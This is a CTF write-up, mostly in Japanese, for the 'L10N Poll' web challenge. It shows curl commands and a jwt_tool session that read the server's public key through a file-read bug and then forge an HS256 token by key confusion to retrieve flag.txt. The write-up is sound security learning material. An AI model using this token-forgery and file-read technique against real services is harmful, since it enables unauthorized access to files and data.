# L10N Poll:webex:300pts
I made the ultimate polling service! Il supporte tout les langues. Это потому, что на сайте используются передовые технологии локализации. ¿Puedes leer esto? أنا متأكد من أنني لا أستطيع. 立即开始！  
(The flag is stored in `flag.txt`.)  
[package.json](package.json)  
[server.js](server.js)  
[http://web.bcactf.com:49159/](http://web.bcactf.com:49159/)  
  
Hint 1 of 3  
How is the localisation/localization implemented?  
Hint 2 of 3  
Check out RFC 7519 perhaps  
Hint 3 of 3  
Take a close look at the package.json...  

# Solution
サイトにアクセスすると言語を指定できるアンケートのようだ。  
[site.png](site/site.png)  
配布されたソースを見るとcookieのJWTに言語を保存しているようだ。  
server.jsの以下の部分が気にかかる。  
```JavaScript
~~
const languageRegex = /^[a-z]+$/;
~~
router.post("/localization-language", async ctx => {
    const language = ctx.request.body?.language;
    if (typeof language === "string") {
        if (language.match(languageRegex)) {
            ctx.cookies.set("lion-token", generateToken(language));
        } else {
            ctx.throw(400, msgs[Math.floor(Math.random() * msgs.length)]);
        }
    } else {
        ctx.throw(400, "no language");
    }
    ctx.redirect("/");
});
~~
```
アルファベット小文字の制限はあるが、任意のものをJWTのlanguageに設定できる。  
このlanguageをファイル名としたファイルが読み取られているようなので`flag.txt`にすればよいが`.`が使えない。  
そこで以下に注目する。  
```JavaScript
~~~
const publicKey = readFileSync(join(__dirname, "key"), "utf8");
const msgs = readFileSync(join(__dirname, "errormessages"), "utf8").split("\n").filter(s => s.length > 0);
~~~
```
公開鍵とエラーメッセージファイルを読み取れるようだ。  
ここで公開鍵でJWTを改竄できる脆弱性を思い出す。  
まずはkeyを以下のように取得する。  
```bash
$ curl -X POST http://web.bcactf.com:49159/localization-language -d "language=key" -v
~~~
< HTTP/1.1 302 Found
< Set-Cookie: lion-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsYW5ndWFnZSI6ImtleSIsImlhdCI6MTYyMzYwNTQzMH0.jIP2IiDGxBNaEslII5zNaSiXV-NfJZldpAYiRdpK7pKeuEmaqo1kHv4z-W8YIfo1NLMyh1-LP8HM3dGAdUbmGcISKZLwdETKRrGRMR8EB5-k3ndzUqBT7nNUNDAa1bGKdI5XwI8VfRRm8mtbXNMGz73RzN64iS2To8oC8yLI3dw; path=/; httponly
~~~
Redirecting to <a href="/">/</a>.
$ curl -X GET http://web.bcactf.com:49159/localisation-file --cookie "lion-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsYW5ndWFnZSI6ImtleSIsImlhdCI6MTYyMzYwNTQzMH0.jIP2IiDGxBNaEslII5zNaSiXV-NfJZldpAYiRdpK7pKeuEmaqo1kHv4z-W8YIfo1NLMyh1-LP8HM3dGAdUbmGcISKZLwdETKRrGRMR8EB5-k3ndzUqBT7nNUNDAa1bGKdI5XwI8VfRRm8mtbXNMGz73RzN64iS2To8oC8yLI3dw"
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCRaHtUpvSkcf2KCwXTiX48Tjxf
bUVFn7YimqGPQbwTnE0WfR5SxLK/DH0os9jCCeb7pJ08AbHFBzQNUfbg47xI3aJh
PMdjL/w3iqfc56C7lt59u4TeOYc7kguph/GTYDPDZkgtbkFJmbkbg9MvV723U1PW
M7N2P4b2Xf3p7ZtaewIDAQAB
-----END PUBLIC KEY-----
```
こうして公開鍵を取得することに成功する。  
得た公開鍵はkeyに保存しておく。  
次に[The JSON Web Token Toolkit v2](https://github.com/ticarpi/jwt_tool)を用いて以下のようにJWTの改竄を行う。  
```bash
$ git clone https://github.com/ticarpi/jwt_tool
~~~
$ cd jwt_tool/
$ python jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsYW5ndWFnZSI6ImtleSIsImlhdCI6MTYyMzYwNTQzMH0.jIP2IiDGxBNaEslII5zNaSiXV-NfJZldpAYiRdpK7pKeuEmaqo1kHv4z-W8YIfo1NLMyh1-LP8HM3dGAdUbmGcISKZLwdETKRrGRMR8EB5-k3ndzUqBT7nNUNDAa1bGKdI5XwI8VfRRm8mtbXNMGz73RzN64iS2To8oC8yLI3dw -T
~~~
Token header values:
[1] typ = "JWT"
[2] alg = "RS256"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] language = "key"
[2] iat = 1623605430    ==> TIMESTAMP = 2021-06-14 02:30:30 (UTC)
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[5] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of language is: key
Please enter new value and hit ENTER
> flag.txt
[1] language = "flag.txt"
[2] iat = 1623605430    ==> TIMESTAMP = 2021-06-14 02:30:30 (UTC)
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[5] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
Signature unchanged - no signing method specified (-S or -X)
jwttool_a32fb33e317df9c60a5eb5f4e3d00dcc - Tampered token:
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsYW5ndWFnZSI6ImZsYWcudHh0IiwiaWF0IjoxNjIzNjA1NDMwfQ.jIP2IiDGxBNaEslII5zNaSiXV-NfJZldpAYiRdpK7pKeuEmaqo1kHv4z-W8YIfo1NLMyh1-LP8HM3dGAdUbmGcISKZLwdETKRrGRMR8EB5-k3ndzUqBT7nNUNDAa1bGKdI5XwI8VfRRm8mtbXNMGz73RzN64iS2To8oC8yLI3dw
$ python jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsYW5ndWFnZSI6ImZsYWcudHh0IiwiaWF0IjoxNjIzNjA1NDMwfQ.jIP2IiDGxBNaEslII5zNaSiXV-NfJZldpAYiRdpK7pKeuEmaqo1kHv4z-W8YIfo1NLMyh1-LP8HM3dGAdUbmGcISKZLwdETKRrGRMR8EB5-k3ndzUqBT7nNUNDAa1bGKdI5XwI8VfRRm8mtbXNMGz73RzN64iS2To8oC8yLI3dw -X k -pk ../key
        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.3                \______|             @ticarpi

Original JWT:

File loaded: ../key
jwttool_d2cefa5ad18fe82fe82426d0466891e6 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsYW5ndWFnZSI6ImZsYWcudHh0IiwiaWF0IjoxNjIzNjA1NDMwfQ.Hbvl5NSDSsELfeCDs6ZoWiiJsP3O8IHd4G4WWnvULDk
```
こうして改竄されたJWTを得ることができた。  
これを用いて以下のようにリクエストを送る。  
```bash
$ curl -X GET http://web.bcactf.com:49159/localisation-file --cookie "lion-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsYW5ndWFnZSI6ImZsYWcudHh0IiwiaWF0IjoxNjIzNjA1NDMwfQ.Hbvl5NSDSsELfeCDs6ZoWiiJsP
3O8IHd4G4WWnvULDk"
bcactf{je_suis_desole_jai_utilise_google_translate_beaucoup_dfW78ertjk}
```
flagが手に入った。  

## bcactf{je_suis_desole_jai_utilise_google_translate_beaucoup_dfW78ertjk}